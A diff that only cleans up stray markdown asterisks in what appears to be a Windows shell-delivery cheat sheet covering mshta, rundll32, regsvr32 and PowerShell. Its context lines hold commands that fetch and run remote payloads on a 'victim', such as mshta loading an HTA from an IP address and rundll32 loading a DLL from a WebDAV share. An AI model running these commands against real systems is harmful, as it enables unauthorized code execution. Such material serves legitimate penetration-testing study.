@@ -134,7 +134,7 @@ Payload written on disk: **WebDAV client local cache**
 </html>
 ```
 
-**Extracted from** [**here**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)\*\*\*\*
+**Extracted from** [**here**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 
 #### **mshta - sct**
 
@@ -154,7 +154,7 @@ Payload written on disk: **WebDAV client local cache**
 </scriptlet>
 ```
 
-**Extracted from** [**here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)\*\*\*\*
+**Extracted from** [**here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 
 #### **Mshta - Metasploit**
 
@@ -173,7 +173,7 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-\*\*\*\*[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)\*\*\*\*
+[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
 
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
@@ -208,7 +208,7 @@ Payload written on disk: **IE local cache**
 </scriptlet>
 ```
 
-**Extracted from** [**here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)\*\*\*\*
+**Extracted from** [**here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 
 #### **Rundll32 - Metasploit**
 
@@ -266,7 +266,7 @@ Payload written on disk: **WebDAV client local cache**
 </scriptlet>
 ```
 
-**Extracted from** [**here**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)\*\*\*\*
+**Extracted from** [**here**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
 
 #### **Regsvr32 - Metasploit**
 
@@ -418,7 +418,7 @@ Payload written on disk: **WebDAV client local cache**
 
 **I haven't tried it**
 
-\*\*\*\*[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)\*\*\*\*
+[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)
 
 ## Odbcconf
 
@@ -431,7 +431,7 @@ Payload written on disk: **WebDAV client local cache**
 
 **I haven't tried it**
 
-\*\*\*\*[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)\*\*\*\*
+[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
 ## Powershell Shells
 
@@ -457,7 +457,7 @@ Defender doesn't detect it as malicious code \(yet, 3/04/2019\).
 
 ### **PS-Powercat**
 
-\*\*\*\*[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)\*\*\*\*
+[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
 Download, start web server, star listener and execute in victim:
 
